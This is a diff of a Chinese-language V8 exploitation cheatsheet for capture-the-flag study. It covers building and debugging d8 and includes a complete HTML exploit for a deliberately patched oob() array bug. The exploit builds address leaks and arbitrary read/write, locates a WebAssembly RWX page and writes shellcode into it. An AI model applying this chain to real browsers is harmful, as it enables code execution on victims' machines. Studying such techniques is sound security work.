@@ -4,24 +4,26 @@ date: 2023-08-30 23:21:23
 tags:
   - V8
 ---
-> [!summary] 
+
+> [!summary]
 > 感觉浏览器是最复杂的用户态程序之一，而 JS 引擎又是浏览器中最复杂的组件之一。
 >
 > 故在比赛中受挫后下定决心研究一下 V8，~~也许这会成为我以后的研究方向😋~~。
+
 # V8 Pwn Cheatsheet
 
 ## Installation
 
 Chrome 中 JavaScript 的解释器被称为 V8，下载的 V8 源码经过编译后得到可执行文件 d8，而 d8 往往又分为 `debug` 和 `release` 版本。
 
-先是下载源码：
+本地编译用于调试的可执行文件 d8：
 
-- 安装 `depot_tools` 用于下载 V8 源码：
+- **安装 `depot_tools` 用于下载 V8 源码：**
 
   - `git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git`
   - `echo "set -gx PATH $(pwd)/depot_tools $PATH" >> ~/.config/fish/config.fish`
 
-- 安装 `ninja` 用于编译 V8：
+- **安装 `ninja` 用于编译 V8：**
 
   - `git clone https://github.com/ninja-build/ninja.git`
   - `cd ninja && ./configure.py --bootstrap && cd ..`
@@ -30,13 +32,16 @@ Chrome 中 JavaScript 的解释器被称为 V8，下载的 V8 源码经过编译
   - ~~`set -gx all_proxy socks5://x.x.x.x:xxxx`~~
   - `fetch v8`
 
-- 接下来编译：
+- **接下来编译：**
 
-  - `cd v8 && gclient sync`
-  - `tools/dev/v8gen.py x64.debug`
-  - `ninja -C out.gn/x64.debug `
+- `cd v8 && gclient sync`
+- `tools/dev/v8gen.py x64.debug`
+- `ninja -C out.gn/x64.debug `
 
-- 编译结果位于：
+> [!tips]
+> 通常作为攻击者，希望编译时附带调试信息却又没有额外的检查，但是默认生成的 debug 配置文件 `out.gn/x64.debug/args.gn` 中会包含 `v8_enable_slow_dchecks = true`，可以将其改为 `true` 以免影响攻击。
+
+- **编译结果位于：**
 
   - `./out.gn/x64.debug/d8`
 
@@ -48,47 +53,58 @@ Chrome 中 JavaScript 的解释器被称为 V8，下载的 V8 源码经过编译
 git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
 gclient sync
 git apply < oob.diff
+
+# debug
 tools/dev/v8gen.py x64.debug
 ninja -C out.gn/x64.debug d8
+
+# release
 tools/dev/v8gen.py x64.release
 ninja -C out.gn/x64.release d8
 ```
 
 ## Debug
 
-在 `./v8/tools/gdbinit` 中提供了便于调试 V8 的 gdb 脚本, 主要提供了 `job` 指令。
+在 `./v8/tools/gdbinit` 中提供了便于调试 V8 的 gdb 脚本，主要提供了 `job` 指令来根据地址查看对象。
 
-调试时需要打开 `allow-natives-syntax` 选项:
+调试时需要打开 `allow-natives-syntax` 选项：
 
 ```bash
 gdb ./d8
 set args --allow-natives-syntax
 r
-source ~/.gdbinit_v8
+source gdbinit_v8
 ```
 
 ### gdb
 
 - `telescope [addr] [length]`
+
   - 查看目标地址内存数据
+
 - `job [addr]`
+
   - 显示 JavaScript 对象的内存结构
 
-**V8 在内存中只有数字和对象两种数据结构的表示, 为了区分, 内存地址最低位是 1 则表示该地址上的数据结构是对象。**
+> [!caution]
+> V8 在内存中只有数字和对象两种数据结构的表示, 为了区分, 内存地址最低位是 1 则表示该地址上的数据结构是对象。
 
-**即指针标记机制, 用来区分指针、双精度数、SMIS（immediate small integer）**
+即指针标记机制, 用来区分指针、双精度数、SMIS（immediate small integer）。
 
-```
+```bash
 Double: Shown as the 64-bit binary representation without any changes
-Smi: Represented as value << 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000
-Pointers: Represented as addr & 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9
+Smi: Represented as value << 32, i.e. 0xdeadbeef is represented as 0xdeadbeef00000000
+Pointers: Represented as addr | 1, i.e. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9
 ```
 
 ### JavaScript
 
-- `%DebugPrint(obj)`
+- `%DebugPrint(obj);`
+
   - 查看对象地址
-- `%SystemBreak()`
+
+- `%SystemBreak();`
+
   - 触发调试中断结合 gdb 使用
 
 ### 对象结构
@@ -511,100 +527,87 @@ print(to_js(data))
 
 ```html
 <script>
-  var buf = new ArrayBuffer(16);
-  var float64 = new Float64Array(buf);
-  var bigUint64 = new BigUint64Array(buf);
+  var buf = new ArrayBuffer(16)
+  var float64 = new Float64Array(buf)
+  var bigUint64 = new BigUint64Array(buf)
 
   function f2i(f) {
-    float64[0] = f;
-    return bigUint64[0];
+    float64[0] = f
+    return bigUint64[0]
   }
   function i2f(i) {
-    bigUint64[0] = i;
-    return float64[0];
+    bigUint64[0] = i
+    return float64[0]
   }
   function hex(x) {
-    return x.toString(16).padStart(16, "0");
+    return x.toString(16).padStart(16, "0")
   }
 
-  var obj = {};
-  var obj_list = [obj];
-  var float_list = [4.3];
+  var obj = {}
+  var obj_list = [obj]
+  var float_list = [4.3]
 
-  var obj_map = obj_list.oob();
-  var float_map = float_list.oob();
+  var obj_map = obj_list.oob()
+  var float_map = float_list.oob()
 
   function get_addr(target_obj) {
-    obj_list[0] = target_obj;
-    obj_list.oob(float_map);
-    let res = f2i(obj_list[0]) - 1n;
-    obj_list.oob(obj_map);
-    return res;
+    obj_list[0] = target_obj
+    obj_list.oob(float_map)
+    let res = f2i(obj_list[0]) - 1n
+    obj_list.oob(obj_map)
+    return res
   }
   function get_obj(target_addr) {
-    float_list[0] = i2f(target_addr + 1n);
-    float_list.oob(obj_map);
-    let res = float_list[0];
-    float_list.oob(float_map);
-    return res;
+    float_list[0] = i2f(target_addr + 1n)
+    float_list.oob(obj_map)
+    let res = float_list[0]
+    float_list.oob(float_map)
+    return res
   }
 
-  var fake_float_array = [
-    float_map,
-    i2f(0n),
-    i2f(0xdeadbeefn),
-    i2f(0x400000000n),
-    4.3,
-    4.3,
-  ];
-  var fake_array_addr = get_addr(fake_float_array);
-  var fake_elements_addr = fake_array_addr - 0x30n;
-  var fake_obj = get_obj(fake_elements_addr);
+  var fake_float_array = [float_map, i2f(0n), i2f(0xdeadbeefn), i2f(0x400000000n), 4.3, 4.3]
+  var fake_array_addr = get_addr(fake_float_array)
+  var fake_elements_addr = fake_array_addr - 0x30n
+  var fake_obj = get_obj(fake_elements_addr)
 
   function arb_read(target_addr) {
-    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
-    let res = f2i(fake_obj[0]);
-    console.log(
-      "[SUCCESS] data from 0x" + hex(target_addr) + " is: 0x" + hex(res),
-    );
-    return res;
+    fake_float_array[2] = i2f(target_addr - 0x10n + 1n)
+    let res = f2i(fake_obj[0])
+    console.log("[SUCCESS] data from 0x" + hex(target_addr) + " is: 0x" + hex(res))
+    return res
   }
   function arb_write(target_addr, data) {
-    fake_float_array[2] = i2f(target_addr - 0x10n + 1n);
-    fake_obj[0] = i2f(data);
-    console.log(
-      "[SUCCESS] written to 0x" + hex(target_addr) + " with: 0x" + hex(data),
-    );
+    fake_float_array[2] = i2f(target_addr - 0x10n + 1n)
+    fake_obj[0] = i2f(data)
+    console.log("[SUCCESS] written to 0x" + hex(target_addr) + " with: 0x" + hex(data))
   }
 
-  var data_buf = new ArrayBuffer(8);
-  var data_view = new DataView(data_buf);
-  var buf_backing_store_addr = get_addr(data_buf) + 0x20n;
+  var data_buf = new ArrayBuffer(8)
+  var data_view = new DataView(data_buf)
+  var buf_backing_store_addr = get_addr(data_buf) + 0x20n
   function writeDataview(addr, data) {
-    arb_write(buf_backing_store_addr, addr);
-    data_view.setBigUint64(0, data, true);
-    console.log("[*] write to : 0x" + hex(addr) + ": 0x" + hex(data));
+    arb_write(buf_backing_store_addr, addr)
+    data_view.setBigUint64(0, data, true)
+    console.log("[*] write to : 0x" + hex(addr) + ": 0x" + hex(data))
   }
 
   var wasmCode = new Uint8Array([
-    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
-    130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
-    128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
-    128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0,
-    0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11,
-  ]);
-  var wasmModule = new WebAssembly.Module(wasmCode);
-  var wasmInstance = new WebAssembly.Instance(wasmModule, {});
-  var exp = wasmInstance.exports.main;
-  var exp_addr = get_addr(exp);
-  console.log("[+] Addr of exp:  0x" + hex(exp_addr));
+    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128,
+    0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128,
+    128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97,
+    105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11,
+  ])
+  var wasmModule = new WebAssembly.Module(wasmCode)
+  var wasmInstance = new WebAssembly.Instance(wasmModule, {})
+  var exp = wasmInstance.exports.main
+  var exp_addr = get_addr(exp)
+  console.log("[+] Addr of exp:  0x" + hex(exp_addr))
 
-  var shared_info_addr = arb_read(exp_addr + 0x18n) - 0x1n;
-  var wasm_exported_func_data_addr = arb_read(shared_info_addr + 0x8n) - 0x1n;
-  var wasm_instance_addr =
-    arb_read(wasm_exported_func_data_addr + 0x10n) - 0x1n;
-  var rwx_page_addr = arb_read(wasm_instance_addr + 0x88n);
-  console.log("[*] leak rwx_segment_addr: 0x" + hex(rwx_page_addr));
+  var shared_info_addr = arb_read(exp_addr + 0x18n) - 0x1n
+  var wasm_exported_func_data_addr = arb_read(shared_info_addr + 0x8n) - 0x1n
+  var wasm_instance_addr = arb_read(wasm_exported_func_data_addr + 0x10n) - 0x1n
+  var rwx_page_addr = arb_read(wasm_instance_addr + 0x88n)
+  console.log("[*] leak rwx_segment_addr: 0x" + hex(rwx_page_addr))
 
   var sc_arr = [
     0x10101010101b848n,
@@ -621,18 +624,18 @@ print(to_js(data))
     0x52d231503d59414cn,
     0x4852e201485a086an,
     0x50f583b6ae289n,
-  ];
+  ]
 
-  var buffer = new ArrayBuffer(sc_arr.length * 8 + 8);
-  var data_view = new DataView(buffer);
-  var buf_backing_store_addr = get_addr(buffer) + 0x20n;
+  var buffer = new ArrayBuffer(sc_arr.length * 8 + 8)
+  var data_view = new DataView(buffer)
+  var buf_backing_store_addr = get_addr(buffer) + 0x20n
 
-  arb_write(buf_backing_store_addr, rwx_page_addr);
+  arb_write(buf_backing_store_addr, rwx_page_addr)
   for (let i = 0; i < sc_arr.length; i++) {
-    data_view.setFloat64(i * 8, i2f(sc_arr[i]), true);
+    data_view.setFloat64(i * 8, i2f(sc_arr[i]), true)
   }
 
-  exp();
+  exp()
 </script>
 ```
 
